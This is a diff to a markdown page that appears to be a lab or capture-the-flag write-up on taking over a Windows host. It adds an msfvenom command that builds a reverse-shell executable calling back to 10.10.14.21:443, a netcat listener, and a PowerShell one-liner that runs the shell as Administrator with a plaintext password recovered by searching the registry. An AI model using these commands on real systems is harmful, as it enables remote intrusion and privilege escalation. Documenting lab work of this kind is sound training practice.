@@ -71,7 +71,7 @@ Notes:
 
 <mark style="color:yellow;">Netcat Banner Grabbing Attempt</mark>:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 * I also tried to navigate to the HTTP port 9255 and 9256 but it wasn't returning results
 
@@ -200,4 +200,17 @@ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.2
   * <mark style="color:red;">`reg query HKLM /f password /t REG_SZ /s`</mark>
   * <mark style="color:yellow;">DefaultPassword REG\_SZ Welcome1!</mark>
 * It appears that we have some creds!
-*
+* Let's generate a reverse shell payload with Msfvenom
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 -f exe > shell.exe
+```
+
+* Start a nc listener on 443 again
+* Create a new object with PowerShell
+
+```
+powershell -c "$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('Administrator', $password);Start-Process -FilePath "shell.exe" -Credential $creds"
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
